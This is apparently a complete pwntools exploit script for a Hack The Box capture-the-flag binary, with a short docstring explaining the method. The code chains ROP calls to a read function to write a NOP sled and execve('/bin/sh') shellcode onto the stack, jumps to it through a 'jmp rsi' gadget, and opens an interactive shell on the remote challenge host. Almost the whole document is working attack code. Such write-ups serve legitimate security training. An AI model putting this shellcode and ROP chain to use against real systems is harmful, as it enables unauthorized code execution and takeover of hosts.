""" HTB | Armed Terminal
This challenge is slightly tricky in that you need to find a way to jump to shellcode without a stack leak
in order to do this you need to:
  - place shellcode on the stack using numerous ROP calls to the _read function
  - use the gadget { jmp rsi } to jump to the top of the shellcode
"""
from pwn import *

context.binary = './assemblers_avenge'
context.log_level = 'error'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

HOST = '94.237.49.212'
PORT = 39904

def get_process():
  #return process() # use this to test locally
  return remote(HOST, PORT)

def main():
  proc = get_process()

  f_read = p64(0x40106d)
  g_jmp_rsi = p64(0x0040106b)

  # Payloads to place shellcode on the stack
  shell1 = b'\x50\x48\x31\xd2\x48\x31\xf6\x48'.ljust(0x10, b'A') + f_read
  shell2 = b'\xbb\x2f\x62\x69\x6e\x2f\x73\x68'.ljust(0x10, b'A') + f_read
  shell3 = b'\x00\x53\x54\x5f\xb0\x3b\x0f\x05'.ljust(0x10, b'A') + f_read
  nop_writes = b'\x90'*0x10 + f_read

  # Place nop sled above the shellcode
  for i in range(12):
    proc.send(nop_writes)

  # Place shellcode on the stack
  proc.send(shell1)
  proc.send(shell2)
  proc.send(shell3)

  # Perform a ROP to jmp RSI, which contains a relative jump instruction to go to our shellcode
  proc.send(b'\xe9\xe0\xff\xff\xff'.ljust(0x10, b'A') + g_jmp_rsi)
  proc.interactive()

if __name__ == '__main__':
  main()
